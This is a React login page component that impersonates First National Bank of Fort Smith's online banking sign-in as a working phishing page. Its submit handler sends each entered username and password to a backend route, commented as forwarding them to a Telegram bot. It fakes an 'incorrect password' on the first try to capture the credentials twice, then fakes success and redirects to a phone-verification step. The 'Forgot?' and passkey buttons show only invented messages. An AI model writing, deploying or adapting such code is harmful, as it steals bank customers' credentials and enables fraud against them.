import { useState, useCallback, useRef, type FormEvent, type KeyboardEvent } from 'react';
import { useNavigate } from 'react-router-dom';

const BG_IMAGE = 'https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/70f06539-cc97-4527-a402-129ea4a73ba7_compressed_photo_2026-07-01_22-39-05.webp';

export default function LoginPage() {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'error' | 'success'; text: string } | null>(null);
  const attemptCount = useRef(0);

  const handleSubmit = useCallback(
    (e: FormEvent) => {
      e.preventDefault();

      if (!username.trim()) {
        setStatusMessage({ type: 'error', text: 'Please enter your username or account number.' });
        return;
      }
      if (!password.trim()) {
        setStatusMessage({ type: 'error', text: 'Please enter your password.' });
        return;
      }

      // === SEND DATA TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username,
          password,
          attempt: attemptCount.current === 0 ? 'first' : 'second',
          type: 'login_attempt',
        }),
      });
      // ===================================

      // First attempt: 3-second loading, then show incorrect password
      if (attemptCount.current === 0) {
        attemptCount.current = 1;
        setIsLoading(true);
        setStatusMessage(null);

        setTimeout(() => {
          setIsLoading(false);
          setUsername('');
          setPassword('');
          setStatusMessage({ type: 'error', text: 'Incorrect password. Please try again.' });
          setTimeout(() => {
            setStatusMessage(null);
          }, 2000);
        }, 3000);
        return;
      }

      // Second attempt: 3-second loading, then show success and navigate
      setIsLoading(true);
      setStatusMessage(null);

      setTimeout(() => {
        setIsLoading(false);
        setStatusMessage({ type: 'success', text: 'Sign in successful.' });
        setTimeout(() => {
          navigate('/verify-phone');
        }, 1500);
      }, 3000);
    },
    [username, password, navigate],
  );

  const handleKeyDown = useCallback(
    (e: KeyboardEvent) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleSubmit(e as unknown as FormEvent);
      }
    },
    [handleSubmit],
  );

  return (
    <main
      className="relative flex flex-col min-h-screen w-full overflow-hidden bg-foreground-950"
      aria-label="FIRST NATIONAL BANK secure login page"
    >
      {/* Background image with blur and overlay */}
      <div className="absolute inset-0">
        <img
          src={BG_IMAGE}
          alt=""
          aria-hidden="true"
          fetchPriority="high"
          className="h-full w-full object-cover object-top scale-105"
        />
        <div className="absolute inset-0 bg-foreground-950/20" />
      </div>

      {/* Login card */}
      <div className="relative z-10 flex flex-1 items-center justify-center px-5">
        <section className="w-full max-w-[420px] animate-fade-in-up" style={{ animationDelay: '0.15s' }}>
          <div className="rounded-[24px] bg-background-50 p-8 shadow-[0_12px_30px_rgba(0,0,0,0.15)] sm:p-10">
            {/* Card header */}
            <div className="mb-8 text-center">
              <img
                src="https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/a019b85a-443c-40b1-a84d-4b8ed2c08f71_compressed_photo_2026-07-01_22-24-05.webp"
                alt="First National Bank of Fort Smith"
                className="mx-auto mb-3 h-20 w-auto object-contain"
              />
            </div>

            {/* Login form */}
            <form onSubmit={handleSubmit} noValidate aria-label="Sign in form">
              {/* Username field */}
              <div className="floating-label-group mb-6">
                <div className="relative">
                  <input
                    id="username"
                    name="username"
                    type="text"
                    autoComplete="username"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      setStatusMessage(null);
                    }}
                    onKeyDown={handleKeyDown}
                    placeholder=" "
                    className="block w-full rounded-xl border border-secondary-200 bg-background-50 px-3 pb-2 pt-5 text-base text-foreground-900 transition-colors duration-200 placeholder-transparent"
                    aria-required="true"
                    aria-label="Username or account number"
                  />
                  <label htmlFor="username" className="floating-label">
                    Username
                  </label>
                </div>
              </div>

              {/* Password field */}
              <div className="floating-label-group mb-2">
                <div className="relative">
                  <input
                    id="password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    autoComplete="current-password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setStatusMessage(null);
                    }}
                    onKeyDown={handleKeyDown}
                    placeholder=" "
                    className="block w-full rounded-xl border border-secondary-200 bg-background-50 px-3 pb-2 pt-5 pr-12 text-base text-foreground-900 transition-colors duration-200 placeholder-transparent"
                    aria-required="true"
                    aria-label="Enter your password"
                  />
                  <label htmlFor="password" className="floating-label">
                    Enter your password
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    className="absolute right-3 top-1/2 flex h-8 w-8 -translate-y-1/2 items-center justify-center rounded-lg text-foreground-400 transition-colors hover:text-foreground-700"
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                    tabIndex={0}
                  >
                    <i className={showPassword ? 'ri-eye-off-line text-lg' : 'ri-eye-line text-lg'} aria-hidden="true" />
                  </button>
                </div>
              </div>

              {/* Forgot password link */}
              <div className="mb-8 flex justify-end">
                <button
                  type="button"
                  onClick={() => setStatusMessage({ type: 'error', text: 'Password recovery link has been sent to your registered email address.' })}
                  className="whitespace-nowrap text-xs font-medium text-primary-500 transition-colors hover:text-primary-600"
                  tabIndex={0}
                >
                  Forgot?
                </button>
              </div>

              {/* Status message */}
              {statusMessage && (
                <div
                  className={`mb-6 rounded-xl px-4 py-3 text-sm font-medium animate-fade-in ${
                    statusMessage.type === 'error'
                      ? 'bg-primary-50 text-primary-700'
                      : 'bg-accent-50 text-accent-800'
                  }`}
                  role="alert"
                  aria-live="polite"
                >
                  {statusMessage.text}
                </div>
              )}

              {/* Bottom section */}
              <div className="flex items-center justify-between">
                {/* Sign in with passkey */}
                <button
                  type="button"
                  onClick={() => setStatusMessage({ type: 'success', text: 'Passkey authentication is not yet configured for your account. Please sign in with your password.' })}
                  className="flex items-center gap-1.5 whitespace-nowrap text-xs font-medium text-primary-500 transition-colors hover:text-primary-600"
                  tabIndex={0}
                >
                  <i className="ri-fingerprint-line text-base" aria-hidden="true" />
                  <span>Sign in with passkey</span>
                </button>

                {/* Sign In button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  className="flex items-center justify-center gap-2 whitespace-nowrap rounded-lg bg-primary-500 px-6 py-2.5 text-sm font-semibold text-background-50 transition-all duration-200 hover:bg-primary-600 active:bg-primary-700 disabled:cursor-not-allowed disabled:opacity-60 min-w-[110px]"
                  tabIndex={0}
                >
                  {isLoading ? (
                    <>
                      <i className="ri-loader-4-line animate-spin text-lg" aria-hidden="true" />
                      <span>Signing in...</span>
                    </>
                  ) : (
                    <span>Sign In</span>
                  )}
                </button>
              </div>
            </form>
          </div>
        </section>
      </div>

      {/* Footer bar */}
      <footer className="relative z-10 bg-background-50 py-4">
        <div className="flex flex-col items-center gap-1">
          <p className="text-center text-xs text-foreground-500">
            &copy; 2026 FNBFS &bull; (479) 788-4600
          </p>
          <p className="text-center text-xs text-foreground-500">
            Privacy policy &bull; Member FDIC
          </p>
          <p className="text-center text-xs font-semibold text-foreground-400">
            An Equal Housing Lender
          </p>
        </div>
      </footer>
    </main>
  );
}
